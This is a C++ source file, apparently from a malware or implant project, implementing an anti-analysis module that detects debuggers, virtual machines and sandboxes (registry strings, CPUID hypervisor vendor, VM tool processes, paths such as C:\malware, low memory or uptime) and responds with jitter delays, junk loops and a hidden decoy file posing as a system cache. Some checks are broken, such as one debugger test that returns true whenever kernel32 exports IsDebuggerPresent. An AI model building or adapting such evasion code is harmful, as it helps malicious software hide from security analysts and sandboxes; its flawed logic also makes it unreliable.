#include "security/AntiAnalysis.h"
#include "core/Logger.h"
#include "utils/SystemUtils.h"
#include "utils/FileUtils.h"
#include "utils/TimeUtils.h"

#include <string>
#include <vector>
#include <fstream>
#include <chrono>
#include <cstdint>
#include <thread>
#include <random>
#include <Windows.h>
#include <winreg.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <tlhelp32.h> // For process enumeration

namespace security {

// Simple process checking function since we can't rely on SystemUtils
bool IsProcessRunning(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return false;
    }

    bool found = false;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            found = true;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return found;
}

bool AntiAnalysis::IsDebuggerPresent() {
    std::vector<bool(*)(void)> checks = {
        []() -> bool { return !!::IsDebuggerPresent(); },
        []() -> bool {
            HMODULE hModule = GetModuleHandleA("kernel32.dll");
            return hModule && GetProcAddress(hModule, "IsDebuggerPresent");
        },
        []() -> bool {
            // Alternative to __try/__except using safe methods
            typedef BOOL (WINAPI *CheckDebuggerPresentFunc)();
            CheckDebuggerPresentFunc func = (CheckDebuggerPresentFunc)GetProcAddress(
                GetModuleHandleA("kernel32.dll"), "IsDebuggerPresent");
            return func && func();
        },
        []() -> bool {
            HANDLE hProcess = GetCurrentProcess();
            BOOL isDebugged = FALSE;
            return (CheckRemoteDebuggerPresent(hProcess, &isDebugged) && isDebugged);
        },
        []() -> bool {
            // Use NtQueryInformationProcess for PEB access (safer method)
            typedef NTSTATUS (WINAPI *NtQueryInformationProcessFunc)(
                HANDLE, ULONG, PVOID, ULONG, PULONG);
            
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            if (!ntdll) return false;

            NtQueryInformationProcessFunc NtQueryInformationProcess = 
                (NtQueryInformationProcessFunc)GetProcAddress(ntdll, "NtQueryInformationProcess");
            
            if (!NtQueryInformationProcess) return false;

            ULONG isDebugged = 0;
            NTSTATUS status = NtQueryInformationProcess(
                GetCurrentProcess(),
                7, // ProcessDebugPort
                &isDebugged,
                sizeof(isDebugged),
                NULL
            );

            return SUCCEEDED(status) && isDebugged != 0;
        }
    };

    for (const auto& check : checks) {
        if (check()) {
            LOG_WARN("Debugger detected");
            return true;
        }
    }
    
    return false;
}

bool AntiAnalysis::IsRunningInVM() {
    std::vector<bool> results;
    
    // Windows-specific VM checks
    results.push_back([]() -> bool {
        HKEY hKey;
        const char* vmKeys[] = {
            "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
            "HARDWARE\\Description\\System\\SystemBiosVersion",
            "HARDWARE\\Description\\System\\VideoBiosVersion"
        };

        for (const auto& key : vmKeys) {
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char buffer[256];
                DWORD size = sizeof(buffer);
                if (RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                    std::string value(buffer);
                    if (value.find("VMware") != std::string::npos ||
                        value.find("Virtual") != std::string::npos ||
                        value.find("Xen") != std::string::npos ||
                        value.find("QEMU") != std::string::npos) {
                        RegCloseKey(hKey);
                        return true;
                    }
                }
                RegCloseKey(hKey);
            }
        }
        return false;
    }());
    
    // CPUID-based check
    results.push_back([]() -> bool {
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 0x40000000);
        
        // Check for hypervisor vendor IDs
        std::string vendor;
        vendor.append(reinterpret_cast<char*>(&cpuInfo[1]), 4);
        vendor.append(reinterpret_cast<char*>(&cpuInfo[2]), 4);
        vendor.append(reinterpret_cast<char*>(&cpuInfo[3]), 4);
        
        return vendor.find("VMware") != std::string::npos ||
               vendor.find("Microsoft") != std::string::npos ||
               vendor.find("Xen") != std::string::npos ||
               vendor.find("KVM") != std::string::npos ||
               vendor.find("prl hyperv") != std::string::npos; // Parallels
    }());

    // Check for common VM files
    results.push_back([]() -> bool {
        const char* vmFiles[] = {
            "C:\\analysis",
            "C:\\sandbox", 
            "C:\\malware",
            "C:\\sample"
        };

        for (const auto& path : vmFiles) {
            if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }
        return false;
    }());

    // Check for VM-specific processes using our local function
    results.push_back([]() -> bool {
        const char* vmProcesses[] = {
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "vboxservice.exe",
            "vboxtray.exe"
        };

        for (const auto& process : vmProcesses) {
            if (IsProcessRunning(process)) {
                return true;
            }
        }
        return false;
    }());

    for (bool result : results) {
        if (result) {
            return true;
        }
    }
    
    return false;
}

bool AntiAnalysis::IsSandboxed() {
    std::vector<bool> results;
    
    // Check for small amount of memory
    results.push_back([]() -> bool {
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024); // Less than 2GB
    }());

    // Check for recent system uptime
    results.push_back([]() -> bool {
        return GetTickCount64() < (2 * 60 * 60 * 1000); // Less than 2 hours
    }());

    // Check for sandbox-specific artifacts
    results.push_back([]() -> bool {
        const char* sandboxPaths[] = {
            "C:\\analysis",
            "C:\\sandbox", 
            "C:\\malware",
            "C:\\sample",
            "C:\\virus"
        };

        for (const auto& path : sandboxPaths) {
            if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }
        return false;
    }());

    // Check number of processors
    results.push_back([]() -> bool {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return sysInfo.dwNumberOfProcessors < 2; // Less than 2 processors
    }());

    for (bool result : results) {
        if (result) {
            return true;
        }
    }
    
    return false;
}

void AntiAnalysis::EvadeAnalysis() {
    // Add random delays
    utils::TimeUtils::JitterSleep(1000, 0.5);

    // Perform benign activities
    volatile int junk = 0;
    for (int i = 0; i < 1000; i++) {
        junk += i * i;
    }

    // Check system resources
    if (IsLowOnResources()) {
        LOG_INFO("System resources low, delaying execution");
        utils::TimeUtils::JitterSleep(5000, 0.3);
    }
}

bool AntiAnalysis::IsLowOnResources() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    return memStatus.dwMemoryLoad > 90 || // Memory usage > 90%
           memStatus.ullAvailPhys < (512 * 1024 * 1024); // Less than 512MB available
}

void AntiAnalysis::Countermeasure() {
    if (IsDebuggerPresent()) {
        ExecuteDecoyOperations();
    }

    if (IsRunningInVM() || IsSandboxed()) {
        utils::TimeUtils::JitterSleep(5000, 0.5);
        VMEvasionTechniques();
    }
}

void AntiAnalysis::ExecuteDecoyOperations() {
    // Execute benign operations to confuse analysis
    volatile int decoy = 0;
    for (int i = 0; i < 1000; i++) {
        decoy += i * i;
        if (decoy % 7 == 0) {
            decoy -= i;
        }
    }

    // Create decoy files and registry entries
    CreateDecoyArtifacts();
}

void AntiAnalysis::CreateDecoyArtifacts() {
    // Create benign-looking files
    std::string tempPath = utils::FileUtils::GetTempPath();
    std::string decoyFile = tempPath + "\\system_cache.tmp";

    std::ofstream file(decoyFile);
    if (file.is_open()) {
        file << "System Cache File\n";
        file << "This file is used by system processes for temporary storage\n";
        file.close();
        
        // Make file hidden
        SetFileAttributesA(decoyFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}

void AntiAnalysis::VMEvasionTechniques() {
    // Timing-based evasion
    auto start = std::chrono::high_resolution_clock::now();
    
    volatile int test = 0;
    for (int i = 0; i < 1000000; i++) {
        test += i * i;
    }
    
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);

    // If execution was too fast (possible VM acceleration)
    if (duration.count() < 1000) {
        utils::TimeUtils::JitterSleep(2000, 0.3);
    }
}

} // namespace security